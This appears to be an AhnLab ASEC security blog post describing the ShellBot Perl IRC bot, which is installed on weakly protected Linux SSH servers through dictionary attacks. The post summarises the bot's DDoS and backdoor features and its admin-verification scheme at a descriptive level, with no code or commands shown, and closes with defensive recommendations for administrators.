AhnLab Security Emergency response Center (ASEC) has recently discovered the ShellBot
malware being installed on poorly managed Linux SSH servers. ShellBot, also known as
PerlBot, is a DDoS Bot malware developed in Perl and characteristically uses IRC protocol to
communicate with the C&C server. ShellBot is an old malware that has been in steady use
and is still being used today to launch attacks against Linux systems.

1. Attack Campaigns Against Linux SSH Servers
Unlike desktop, which is the main work environment for normal users, servers usually take
charge of providing specific services. Accordingly, malware attacks are typically carried out
through web browsers or email attachments in desktop environments, and threat actors also
distribute malware disguised as legitimate software to induce users to install them. Threat
actors attacking server environments use a different method since there are limits to
distributing malware in the ways mentioned above. Services that are poorly managed or are
weak to vulnerability exploitations because they have not been patched to the latest version
are the prime targets.
A main example of a poorly managed service is one where simple account credentials are
used, causing the server to be vulnerable to dictionary attacks. Remote Desktop Protocol
(RDP) and MS-SQL service are prime examples of attack vectors that are used when

targeting Windows operating systems. In Linux servers, Secure Shell (SSH) services are
usually targeted for attacks. In IoT environments where an old Linux server or embedded
Linux OS has been installed, the Telnet service becomes targeted for dictionary attacks.
The ShellBot malware strains that are going to be covered in this post are believed to have
been installed after threat actors used account credentials that have been obtained through
the use of scanners and SSH BruteForce malware on target systems. After scanning
systems that have operational port 22s, threat actors search for systems where the SSH
service is active and uses a list of commonly used SSH account credentials to initiate their
dictionary attack. The following is a list of the actual account credentials used by threat
actors who install ShellBot. (A far greater number of account credentials were used in the
actual attacks, but only the main examples were organized here.)

2. Internet Relay Chat (IRC) Protocol
A characteristic of ShellBot, aside from the fact that it is developed in Perl, is that it uses an
IRC protocol to communicate with C&C servers. IRC is a real-time Internet chat protocol
developed in 1988. Users log onto certain channels of certain IRC servers and chat with
other users who have logged onto the same channel in real time.
IRC Bot is a bot malware that abuses this IRC service to communicate with C&C servers.
The IRC Bot installed on the infected system accesses an IRC server’s channel designated
by the threat actor according to the IRC protocol, after which it transmits stolen information to
the specified channel, or when the attacker enters a particular string, receives this as a
command and performs the corresponding malicious behavior.

IRC has seen consistent use from malware since the past as it uses a preexisting IRC
protocol and IRC server without having to develop a separate C&C server and protocol.
Although it has been seeing less use by malware targeting Windows operating systems, a
large number of IRC Bots are still being distributed on Linux.

3. ShellBot Analysis
ShellBot has been used by various threat actors for a considerable amount of time, and a
previous ASEC Blog post covered its use in attacks along with CoinMiners.

Another characteristic of ShellBot is the fact that they all have different forms and features
since threat actors can customize them. The team has categorized ShellBot into three main
types based on recent findings and summarized the commands, characteristics, and DDoS
attacks the malware uses during installation.

The following is a ShellBot named “LiGhT’s Modded perlbot v2”.

“LiGhT’s Modded perlbot v2” is being used by a variety of threat actors. The following
commands are used in the ShellBot installation after the SSH server has been successfully
logged into.

Configuration data such as the C&C server and the name of the channel to join are included
in the initial routine of ShellBot. A nickname with the format “IP-[5 random digits]” is used to
join the IRC channels.

The “LiGhT’s Modded perlbot v2” version of ShellBot offers various features which are
largely categorized in the table below. Commands that can actually be used for malicious
purposes include DDoS commands such as TCP, UDP, and HTTP Flooding. It also includes
a variety of commands that allows control over infected systems so that they can be used in
other attacks such as reverse shell, log deletion, and scanner.

Additionally, regular IRC Bots receive commands from the threat actor via the IRC channels
to perform malicious acts. Thus, there is a need to verify the threat actor sending commands.
Without a verification process, any users can join the channel and control the bots however
they want.
In order to do this, the IRC Bot has to perform an additional task where users that have
joined the channel must verify their nickname and host address before they can enter a
command. For example, in the case of the “bash” malware, the nickname must be either
“crond,” “drugs,” or “tab” as defined in the “admins” variable, while the host address must be
“localhost” as defined in the “hostauth” variable.

4. Conclusion
Recently, threat actors have been installing variants of the ShellBot malware on inadequately
managed Linux SSH servers. These types of attacks have been occurring consistently since
the past and numerous attacks are still being confirmed. If ShellBot is installed, Linux servers
can be used as DDoS Bots for DDoS attacks against specific targets after receiving a
command from the threat actor. Moreover, the threat actor could use various other backdoor
features to install additional malware or launch different types of attacks from the
compromised server.
Because of this, administrators should use passwords that are difficult to guess for their
accounts and change them periodically to protect the Linux server from brute force attacks
and dictionary attacks, and update to the latest patch to prevent vulnerability attacks.
Administrators should also use security programs such as firewalls for servers accessible
from outside to restrict access by attackers. Finally, V3 should be updated to the latest
version so that malware infection can be prevented.
